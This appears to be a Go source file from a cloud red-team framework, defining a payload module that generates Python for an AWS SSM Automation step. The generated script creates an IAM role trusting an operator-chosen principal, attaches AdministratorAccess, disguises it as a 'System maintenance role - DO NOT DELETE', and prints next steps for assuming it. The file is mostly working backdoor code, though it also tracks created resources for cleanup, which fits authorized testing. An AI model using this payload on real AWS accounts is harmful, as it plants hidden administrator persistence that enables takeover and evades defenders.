// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// AutomationBackdoorCreateRolePayload creates an IAM role with administrator privileges
// via an SSM Automation aws:executeScript Python step.
type AutomationBackdoorCreateRolePayload struct{}

func init() {
	_ = payloads.Register(&AutomationBackdoorCreateRolePayload{})
}

func (p *AutomationBackdoorCreateRolePayload) GetName() string {
	return "backdoor/create-role"
}

func (p *AutomationBackdoorCreateRolePayload) GetDescription() string {
	return "Create an IAM role with administrator privileges via SSM Automation Python step"
}

func (p *AutomationBackdoorCreateRolePayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSMAutomation,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *AutomationBackdoorCreateRolePayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "Trusted principal ARN (e.g. arn:aws:iam::123456789012:user/name) or service (e.g. lambda.amazonaws.com)",
			Required:    true,
		},
		{
			Name:        "ROLE_NAME",
			Description: "Name for the backdoor role (auto-generated if empty)",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "EXTERNAL_ID",
			Description: "External ID condition for the trust policy",
			Required:    false,
			Default:     "",
		},
		{
			Name:        "ROLE_PATH",
			Description: "IAM path for the role",
			Required:    false,
			Default:     "/",
		},
	}
}

func (p *AutomationBackdoorCreateRolePayload) Validate(options map[string]string) error {
	if options["TRUST_PRINCIPAL"] == "" {
		return fmt.Errorf("TRUST_PRINCIPAL is required for backdoor/create-role payload")
	}
	return nil
}

func (p *AutomationBackdoorCreateRolePayload) GenerateCode(options map[string]string) (string, error) {
	trustPrincipal := options["TRUST_PRINCIPAL"]
	roleName := options["ROLE_NAME"]
	externalID := options["EXTERNAL_ID"]
	rolePath := options["ROLE_PATH"]
	if rolePath == "" {
		rolePath = "/"
	}

	principalKey := "AWS"
	if strings.HasSuffix(trustPrincipal, ".amazonaws.com") {
		principalKey = "Service"
	}

	roleNamePython := `"pathrunner-backdoor-" + str(int(__import__('time').time()))`
	if roleName != "" {
		roleNamePython = fmt.Sprintf(`"%s"`, roleName)
	}

	externalIDCondition := ""
	if externalID != "" {
		externalIDCondition = fmt.Sprintf(`,
                    'Condition': {'StringEquals': {'sts:ExternalId': '%s'}}`, externalID)
	}

	code := fmt.Sprintf(`import boto3
import json

trust_principal = '%s'
principal_key = '%s'
role_path = '%s'

def script_handler(events, context):
    iam = boto3.client('iam')
    role_name = %s

    trust_policy = {
        'Version': '2012-10-17',
        'Statement': [
            {
                'Effect': 'Allow',
                'Principal': {principal_key: trust_principal},
                'Action': 'sts:AssumeRole'%s
            }
        ]
    }

    try:
        create_resp = iam.create_role(
            RoleName=role_name,
            Path=role_path,
            AssumeRolePolicyDocument=json.dumps(trust_policy),
            Description='System maintenance role - DO NOT DELETE',
            MaxSessionDuration=43200,
        )
        role_arn = create_resp['Role']['Arn']

        iam.attach_role_policy(
            RoleName=role_name,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        )

        return {
            'Status': 'Success',
            'RoleName': role_name,
            'RoleArn': role_arn,
        }
    except Exception as e:
        return {'Status': 'Error', 'message': str(e)}
`, trustPrincipal, principalKey, rolePath, roleNamePython, externalIDCondition)

	return code, nil
}

func (p *AutomationBackdoorCreateRolePayload) ProcessResult(result string) (string, error) {
	if result == "" {
		return "", nil
	}

	status := extractJSONField(result, "Status")
	if status == "Error" {
		errMsg := extractJSONField(result, "message")
		return fmt.Sprintf("Error creating role: %s\n", errMsg), nil
	}

	roleARN := extractJSONField(result, "RoleArn")
	roleName := extractJSONField(result, "RoleName")
	if roleARN == "" {
		return result, nil
	}

	return fmt.Sprintf("Backdoor role created with AdministratorAccess.\n\nRole Name: %s\nRole ARN:  %s\n\nNext steps:\n  use sts-001\n  set ROLE_ARN %s\n  exploit\n",
		roleName, roleARN, roleARN), nil
}

// ReportSideEffects returns the created role as a tracked resource.
func (p *AutomationBackdoorCreateRolePayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	roleName := options["ROLE_NAME"]
	if roleName == "" {
		roleName = "pathrunner-backdoor-<timestamp>"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:role",
			Name:          roleName,
			CleanupMethod: "iam:DeleteRole",
			Metadata: map[string]string{
				"trust_principal": options["TRUST_PRINCIPAL"],
				"role_path":       options["ROLE_PATH"],
			},
		},
	}
}
